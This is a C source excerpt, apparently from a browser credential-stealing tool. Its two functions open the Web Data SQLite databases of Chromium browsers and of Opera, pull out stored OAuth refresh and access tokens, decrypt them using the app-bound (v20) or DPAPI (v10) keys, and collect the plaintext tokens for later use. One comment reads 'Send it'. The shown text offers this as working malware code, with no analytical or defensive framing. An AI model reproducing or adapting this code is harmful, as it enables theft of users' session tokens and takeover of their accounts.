// This Function Works On All Chromium Browsers But Opera (It Requires A Different Query)
BOOL ExtractRefreshTokenFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                     = NULL;
    sqlite3_stmt*   pStmt                   = NULL;
    INT             nSqliteResult           = SQLITE_OK;
    LPCSTR          szService               = NULL;
    LPCSTR          pszWebDatabasePath      = NULL;
    CHAR            szRelPath[MAX_PATH]     = { 0 };
    PBYTE           pbEncryptedToken        = NULL;
    DWORD           dwEncryptedTokenSize    = 0x00;
    PBYTE           pbDecryptedToken        = NULL;
    DWORD           dwDecryptedTokenSize    = 0x00;
    PBYTE           pbBindingKey            = NULL;
    DWORD           dwBindingKeySize        = 0x00;
    BOOL            bResult                 = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_TOKEN_SERVICE, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[+] Executing Query: %s", SQLQUERY_TOKEN_SERVICE);

    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        szService               = (LPCSTR)sqlite3_column_text(pStmt, 0);
        pbEncryptedToken        = (PBYTE)sqlite3_column_blob(pStmt, 1);
        dwEncryptedTokenSize    = sqlite3_column_bytes(pStmt, 1);
        pbBindingKey            = (PBYTE)sqlite3_column_blob(pStmt, 2);
        dwBindingKeySize        = sqlite3_column_bytes(pStmt, 2);

        pbDecryptedToken        = NULL;
        dwDecryptedTokenSize    = 0;

        if (pbEncryptedToken && dwEncryptedTokenSize)
        {
            // Try v20 (App-Bound Encryption) 
            if (HAS_V20_PREFIX(pbEncryptedToken, dwEncryptedTokenSize))
            {
                if (!DecryptChromiumV20Secret(pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen, pbEncryptedToken, dwEncryptedTokenSize, &pbDecryptedToken, &dwDecryptedTokenSize))
                {
                    DBGA("[!] DecryptChromiumV20Secret Failed For Token: %s", szService);
                }
            }
            // Try v10 
            else if (HAS_V10_PREFIX(pbEncryptedToken, dwEncryptedTokenSize))
            {
                if (!DecryptChromiumV10Secret(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen, pbEncryptedToken, dwEncryptedTokenSize, &pbDecryptedToken, &dwDecryptedTokenSize))
                    DBGA("[!] DecryptChromiumV10Secret Failed For Token: %s", szService);
            }
            
            // Save it
            if (pbDecryptedToken && dwDecryptedTokenSize)
            {
                AddTokenEntry(pChromiumData, szService, pbDecryptedToken, dwDecryptedTokenSize, pbBindingKey, dwBindingKeySize);
                HEAP_FREE_SECURE(pbDecryptedToken, dwDecryptedTokenSize);
            }
        }
    }

    if (nSqliteResult != SQLITE_DONE)
    {
        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt)
        sqlite3_finalize(pStmt);
    if (pDb)
        sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}

BOOL ExtractOperaAccessTokensFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    sqlite3*        pDb                 = NULL;
    sqlite3_stmt*   pStmt               = NULL;
    LPSTR           pszWebDatabasePath  = NULL;
    CHAR            szRelPath[MAX_PATH] = { 0 };
    INT             nResult             = SQLITE_OK;
    BOOL            bResult             = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;


    if ((nResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_OPERA_ACCESS_TOKENS, -1, &pStmt, NULL)) != SQLITE_OK)
    {
        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
        goto _END_OF_FUNC;
    }

    DBGV("[+] Executing Query: %s", SQLQUERY_OPERA_ACCESS_TOKENS);

    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
    {
        // All columns are Base64 encoded and v10 encrypted
        LPCSTR  szClientNameB64     = (LPCSTR)sqlite3_column_text(pStmt, 0);
        LPCSTR  szScopesB64         = (LPCSTR)sqlite3_column_text(pStmt, 1);
        LPCSTR  szTokenB64          = (LPCSTR)sqlite3_column_text(pStmt, 2);
        LPCSTR  szExpirationB64     = (LPCSTR)sqlite3_column_text(pStmt, 3);

        PBYTE   pbClientName        = NULL, pbToken             = NULL,
                pbDecryptedName     = NULL, pbDecryptedToken    = NULL;
        DWORD   dwClientName        = 0x00, dwToken             = 0x00,
                dwDecryptedName     = 0x00, dwDecryptedToken    = 0x00;

        // Decode and decrypt client_name
        if (szClientNameB64 && lstrlenA(szClientNameB64) > 0)
        {
            if ((pbClientName = Base64Decode(szClientNameB64, lstrlenA(szClientNameB64), &dwClientName)))
                DecryptChromiumV10Secret(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen, pbClientName, dwClientName, &pbDecryptedName, &dwDecryptedName);
        }

        // Decode and decrypt token
        if (szTokenB64 && lstrlenA(szTokenB64) > 0)
        {
            if ((pbToken = Base64Decode(szTokenB64, lstrlenA(szTokenB64), &dwToken)))
                DecryptChromiumV10Secret(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen, pbToken, dwToken, &pbDecryptedToken, &dwDecryptedToken);
        }

        // Send it
        if (pbDecryptedToken && dwDecryptedToken > 0)
            AddTokenEntry(pChromiumData, pbDecryptedName ? (LPCSTR)pbDecryptedName : "Unknown", pbDecryptedToken, dwDecryptedToken, NULL, 0);

        HEAP_FREE(pbClientName);
        HEAP_FREE(pbToken);
        HEAP_FREE(pbDecryptedName);
        HEAP_FREE_SECURE(pbDecryptedToken, dwDecryptedToken);
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pStmt) sqlite3_finalize(pStmt);
    if (pDb) sqlite3_close(pDb);
    HEAP_FREE(pszWebDatabasePath);
    return bResult;
}

#pragma endregion

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
